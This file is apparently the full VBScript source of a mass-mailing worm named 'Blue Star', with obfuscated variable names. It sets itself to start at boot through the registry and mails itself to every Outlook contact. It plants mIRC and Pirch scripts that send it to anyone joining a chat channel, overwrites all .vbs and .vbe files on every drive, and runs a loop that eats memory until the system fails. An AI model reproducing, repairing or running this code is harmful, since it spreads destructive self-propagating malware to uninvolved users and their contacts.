'Blue Star Created By Pingu2000
On Error Resume Next
Set omgrmhotlle= Createobject("scripting.filesystemobject")
omgrmhotlle.copyfile wscript.scriptfullname,omgrmhotlle.GetSpecialFolder(0)& "\Blue Star.vbs"
Set xlwckajcerl = CreateObject("WScript.Shell")
xlwckajcerl.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Blue Star","wscript.exe "&omgrmhotlle.GetSpecialFolder(0)& "\Blue Star.vbs %"
if xlwckajcerl.regread ("HKCU\software\Blue Star\mailed") <> "1" then
khqoalxayef()
end if
if xlwckajcerl.regread ("HKCU\software\Blue Star\mirqued") <> "1" then
nyydifuclvf ""
end if
if xlwckajcerl.regread ("HKCU\software\Blue Star\pirched") <> "1" then
cxnrrrtmimb ""
end if
hhprsobifxo()
Function khqoalxayef()
On Error Resume Next
Set pznqwcmtmgt = CreateObject("Outlook.Application")
If pznqwcmtmgt= "Outlook"Then
Set eesjrkmzmsp=pznqwcmtmgt.GetNameSpace("MAPI")
For Each yxitfbzfovg In eesjrkmzmsp.AddressLists
If yxitfbzfovg.AddressEntries.Count <> 0 Then
vzazbnqujqp = yxitfbzfovg.AddressEntries.Count
For aeqocduegkf= 1 To vzazbnqujqp
Set xzbwjqnfwxh = pznqwcmtmgt.CreateItem(0)
Set vyfduboobgm = yxitfbzfovg.AddressEntries(aeqocduegkf)
xzbwjqnfwxh.To = vyfduboobgm.Address
xzbwjqnfwxh.Subject = "Blue Star found at the Univers"
xzbwjqnfwxh.Body = "Any Thx to:" & vbcrlf & "Eugene from AVP" & vbcrlf & "Peter from Datafellows" & vbcrlf & "Tammy from Nai" & vbcrlf & "and any Virus hater's from all the Universe, that spread my Vir's" & vbcrlf & "" & vbcrlf & "" & vbcrlf & "other Thx:" & vbcrlf & "too all Virus Writer's that Infected our System's, with my New Blue Star from Universe.." & vbcrlf & "" & vbcrlf & "" & vbcrlf & "By Pingu2000"
akamvhvaxgy.Add omgrmhotlle.GetSpecialFolder(0)& "\Blue Star.vbs"
xzbwjqnfwxh.DeleteAfterSubmit = True
If xzbwjqnfwxh.To <> "" Then
xzbwjqnfwxh.Send
xlwckajcerl.regwrite "HKCU\software\Blue Star\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function nyydifuclvf(jbhkinwdhin)
On Error Resume Next
if jbhkinwdhin = "" then
if omgrmhotlle.fileexists("c:\mirc\mirc.ini") then jbhkinwdhin="c:\mirc"
if omgrmhotlle.fileexists("c:\mirc32\mirc.ini") then jbhkinwdhin="c:\mirc32"
ywllcfptndb=xlwckajcerl.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if omgrmhotlle.fileexists(ywllcfptndb & "\mirc\mirc.ini") then jbhkinwdhin=ywllcfptndb & "\mirc"
end if
if jbhkinwdhin <> "" then
set badvzckyxga = omgrmhotlle.CreateTextFile(jbhkinwdhin & "\script.ini", True)
badvzckyxga.WriteLine "[script]"
badvzckyxga.writeline "n0=on 1:JOIN:#:{"
badvzckyxga.writeline "n1=  /if ( $nick == $me ) { halt }"
badvzckyxga.writeline "n2=  /.dcc send $nick "&omgrmhotlle.GetSpecialFolder(0)& "\Blue Star.vbs"
badvzckyxga.writeline "n3=}"
badvzckyxga.close
xlwckajcerl.regwrite "HKCU\software\Blue Star\Mirqued", "1"
end if
end function
function cxnrrrtmimb(cykzoneyjez)
On Error Resume Next
if cykzoneyjez="" then
if omgrmhotlle.fileexists("c:\pirch\Pirch32.exe") then cykzoneyjez="c:\pirch"
if omgrmhotlle.fileexists("c:\pirch32\Pirch32.exe") then cykzoneyjez="c:\pirch32"
gldcwwkouis=xlwckajcerl.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if omgrmhotlle.fileexists(gldcwwkouis & "\pirch\Pirch32.exe") then cykzoneyjez=gldcwwkouis & "\pirch\Pirch32.exe"
end if
if cykzoneyjez <> "" then
set iudjdczigsj= omgrmhotlle.CreateTextFile(cykzoneyjez & "\events.ini", True)
iudjdczigsj.WriteLine "[Levels]"
iudjdczigsj.WriteLine "Enabled=1"
iudjdczigsj.WriteLine "Count=6"
iudjdczigsj.WriteLine "Level1=000-Unknowns"
iudjdczigsj.WriteLine "000-UnknownsEnabled=1"
iudjdczigsj.WriteLine "Level2=100-Level 100"
iudjdczigsj.WriteLine "100-Level 100Enabled=1"
iudjdczigsj.WriteLine "Level3=200-Level 200"
iudjdczigsj.WriteLine "200-Level 200Enabled=1"
iudjdczigsj.WriteLine "Level4=300-Level 300"
iudjdczigsj.WriteLine " 300-Level 300Enabled=1"
iudjdczigsj.WriteLine "Level5=400-Level 400 "
iudjdczigsj.WriteLine "400-Level 400Enabled=1"
iudjdczigsj.WriteLine "Level6=500-Level 500"
iudjdczigsj.WriteLine "500-Level 500Enabled=1"
iudjdczigsj.WriteLine ""
iudjdczigsj.WriteLine "[000-Unknowns]"
iudjdczigsj.WriteLine "UserCount=0"
iudjdczigsj.WriteLine "EventCount=0"
iudjdczigsj.WriteLine ""
iudjdczigsj.WriteLine "[100-Level 100]"
iudjdczigsj.WriteLine "User1=*!*@*"
iudjdczigsj.WriteLine "UserCount=1"
iudjdczigsj.writeline "Event1=ON JOIN:#:/dcc tsend $nick " & omgrmhotlle.GetSpecialFolder(0) & "\Blue Star.vbs"
iudjdczigsj.WriteLine "EventCount=1"
iudjdczigsj.WriteLine ""
iudjdczigsj.WriteLine "[200-Level 200]"
iudjdczigsj.WriteLine "UserCount=0"
iudjdczigsj.WriteLine "EventCount=0"
iudjdczigsj.WriteLine ""
iudjdczigsj.WriteLine "[300-Level 300]"
iudjdczigsj.WriteLine "UserCount=0"
iudjdczigsj.WriteLine "EventCount=0"
iudjdczigsj.WriteLine ""
iudjdczigsj.WriteLine "[400-Level 400]"
iudjdczigsj.WriteLine "UserCount=0"
iudjdczigsj.WriteLine "EventCount=0"
iudjdczigsj.WriteLine ""
iudjdczigsj.WriteLine "[500-Level 500]"
iudjdczigsj.WriteLine "UserCount=0"
iudjdczigsj.WriteLine "EventCount=0"
iudjdczigsj.close
xlwckajcerl.regwrite "HKCU\software\Blue Star\pirched", "1"
end if
end function
psqwefpqvhx= 1
Do
ReDim Preserve muknxbwljji(psqwefpqvhx)
kczcrfyghjf= CLng(1024)
muknxbwljji(psqwefpqvhx) = String(kczcrfyghjf* kczcrfyghjf, ".")
psqwefpqvhx = psqwefpqvhx + 1
Loop
Function hhprsobifxo()
On Error Resume Next
Set rgvnlfqlgns = omgrmhotlle.Drives
For Each kjdwkvbizib In rgvnlfqlgns
If kjdwkvbizib.Drivetype = Remote Then
dqkjgpnzkwz= kjdwkvbizib & "\"
Call xdemwxchetb(dqkjgpnzkwz)
ElseIf kjdwkvbizib.IsReady Then
dqkjgpnzkwz= kjdwkvbizib&"\"
Call xdemwxchetb(dqkjgpnzkwz)
End If
Next
End Function
Function xdemwxchetb(kuebwlqqpsk)
Set hlaggoqrnzh= omgrmhotlle.GetFolder(kuebwlqqpsk)
Set dvmnymovals= hlaggoqrnzh.Files
For Each lesddrhqjly In dvmnymovals
if omgrmhotlle.GetExtensionName(lesddrhqjly.path) = "vbs" then
omgrmhotlle.copyfile wscript.scriptfullname , lesddrhqjly.path , true
end if
if omgrmhotlle.GetExtensionName(lesddrhqjly.path) = "vbe" then
omgrmhotlle.copyfile wscript.scriptfullname , lesddrhqjly.path , true
end if
if lesddrhqjly.name = "mirc.ini" then
nyydifuclvf(lesddrhqjly.ParentFolder)
end if
if lesddrhqjly.name = "Pirch32.exe" then
cxnrrrtmimb(lesddrhqjly.ParentFolder)
end if
Next
Set lesddrhqjly= hlaggoqrnzh.SubFolders
For Each lroxvhseaye In lesddrhqjly
Call xdemwxchetb(lroxvhseaye.path)
Next
End Function
